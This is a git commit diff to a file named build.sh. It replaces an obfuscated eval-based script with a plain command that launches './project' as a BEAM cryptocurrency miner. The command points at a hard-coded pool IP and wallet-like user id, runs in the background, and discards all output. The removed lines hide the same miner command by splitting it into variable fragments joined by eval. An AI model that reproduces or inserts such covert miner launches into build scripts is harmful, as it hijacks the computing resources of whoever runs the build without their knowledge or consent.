7e98a77da025393d16aceaaea74aefb2e8e72883
sarifadim <115786763+sarifadim@users.noreply.github.com>
2024-11-08 14:57:32 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,3 +1,1 @@
-z="
-";Gz='I --';gz=')) -';bz='C-7 ';Uz='QW6J';nz='>&1';Pz='ijUT';Ez=' BEA';Kz='11.6';Fz='M-II';jz='ble ';Cz='t --';Nz='ser ';Wz='3j.$';az='Z=UT';Qz='2hws';hz='-tls';Mz=' --u';Iz=' 47.';Bz='ojec';cz='date';iz=' ena';Rz='C862';Az='./pr';Zz='-$(T';ez='H-%M';Yz='o 0A';fz='-%S"';Dz='algo';dz=' +"%';Hz='pool';Vz='ANF6';Xz='(ech';kz='>/de';Lz=':443';lz='v/nu';Tz='BSMz';Sz='trVX';Jz='89.2';mz='ll 2';Oz='3JWu';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz"
+./project --algo BEAM-III --pool 47.236.123.51:80 --user 35abc183df02cef8b5ab05ea3df9ecf5e1b8bbeb8ccc0bdb7a27073e80621131c4e.$(echo 0C-$(TZ=UTC-7 date +"%H-%M-%S")) --tls enable --no-cl >/dev/null 2>&1 &
